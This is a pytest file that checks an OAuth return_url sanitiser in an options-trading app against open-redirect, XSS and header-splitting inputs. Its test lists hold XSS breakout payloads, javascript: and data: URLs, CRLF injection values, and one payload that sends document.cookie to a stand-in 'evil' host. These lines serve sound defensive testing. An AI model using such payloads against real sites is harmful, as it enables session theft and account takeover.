"""Security tests for the OAuth ``return_url`` parameter.

``return_url`` is unauthenticated input that reaches the callback's HTML. It
was interpolated raw into a ``<script>`` string literal and an ``href``, so a
victim who completed a *legitimate* Upstox login would execute attacker code
on the app origin — on the page that had just established a session against a
live broker connection. These tests pin the allow-list.
"""

from __future__ import annotations

import pytest

from options_trading.api.routes.auth import _DEFAULT_RETURN_URL, safe_return_url


class TestRejectsOffOrigin:
    @pytest.mark.parametrize(
        "hostile",
        [
            "//evil.com/steal",  # protocol-relative: browsers read a host
            "///evil.com",
            "https://evil.com",
            "http://evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
        ],
    )
    def test_off_origin_targets_fall_back(self, hostile):
        assert safe_return_url(hostile) == _DEFAULT_RETURN_URL


class TestRejectsInjection:
    @pytest.mark.parametrize(
        "hostile",
        [
            # Breaks out of the JS string literal.
            "/x';fetch('//evil/'+document.cookie)//",
            '/x";alert(1);//',
            "/x\\';alert(1)//",
            # Breaks out of the href attribute.
            '/x"><script>alert(1)</script>',
            "/x'><img src=x onerror=alert(1)>",
            # Header/response splitting.
            "/x\r\nSet-Cookie: a=b",
            "/x\nLocation: //evil.com",
            "/x\tmalicious",
            "/x\x00null",
        ],
    )
    def test_injection_payloads_fall_back(self, hostile):
        assert safe_return_url(hostile) == _DEFAULT_RETURN_URL


class TestAcceptsLegitimate:
    @pytest.mark.parametrize(
        "benign",
        [
            "/dashboard",
            "/",
            "/portfolio?tab=positions",
            "/a/b/c",
            "/dashboard#greeks",
        ],
    )
    def test_same_origin_paths_pass_through(self, benign):
        assert safe_return_url(benign) == benign

    def test_missing_returns_default(self):
        assert safe_return_url(None) == _DEFAULT_RETURN_URL
        assert safe_return_url("") == _DEFAULT_RETURN_URL

    def test_default_is_itself_safe(self):
        assert safe_return_url(_DEFAULT_RETURN_URL) == _DEFAULT_RETURN_URL
